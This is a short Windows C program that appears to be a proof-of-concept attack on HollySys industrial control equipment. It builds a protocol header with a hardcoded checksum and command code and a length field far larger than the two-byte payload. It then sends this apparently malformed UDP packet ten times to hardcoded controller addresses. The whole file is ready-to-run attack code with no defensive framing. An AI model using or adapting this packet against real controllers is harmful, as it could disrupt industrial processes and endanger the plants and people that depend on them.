#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")

#pragma pack(1)
typedef struct {
	unsigned short flag;
	unsigned char type;
	unsigned char unknown0;
	unsigned int datasize;
	unsigned int checksum;
	unsigned int packno;
	unsigned int cmd;
	unsigned int padding;
}HOLLYSYS_PROTOCOL;
#pragma pack()

void mainproc(char * ip,int port) {

	int ret = 0;

	SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET)
	{
		return;
	}

	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(ip); //128.0.0.80 3010 or 128.0.0.10 with 1600
	sa.sin_port = ntohs(port);		


	int totalsize = 4096;
	char * data = new char[totalsize];
	if (data == 0)
	{
		closesocket(s);
		return;
	}
	memset(data, 0, totalsize);
	HOLLYSYS_PROTOCOL * pro = (HOLLYSYS_PROTOCOL*)data;
	pro->flag = 0xaaaa;
	pro->type = 1;
	pro->unknown0 = 0;
	pro->datasize = ntohl(0x10000000);
	pro->checksum = 0x487d9586;
	pro->packno = ntohl(1);
	pro->cmd = 0x2e0a00f;
	pro->padding = 0x00010100;
	memcpy(data + sizeof(HOLLYSYS_PROTOCOL), "\xdf\x00", 2);

	int sasize = sizeof(sockaddr_in);
	ret = sendto(s, data, sizeof(HOLLYSYS_PROTOCOL) + 2,0,(sockaddr*) &sa,sasize);
	closesocket(s);
	delete data;
	if (ret != sizeof(HOLLYSYS_PROTOCOL) + 2)
	{
		return;
	}
	return;
}

int main(int argc, char ** argv) {

	int ret = 0;

	WSADATA wsa = { 0 };
	
	ret = WSAStartup(0x0202, &wsa);
	if (ret)
	{
		return 0;
	}

	for (int i = 0; i < 10; i++)
	{
		//128.0.0.80 3010 or 128.0.0.10 with 1600
		//mainproc("128.0.0.10",1600);
		mainproc("128.0.0.80", 3010);
		Sleep(100);
	}
	WSACleanup();

	printf("end\r\n");
	//ExitProcess(0);
	return 0;
}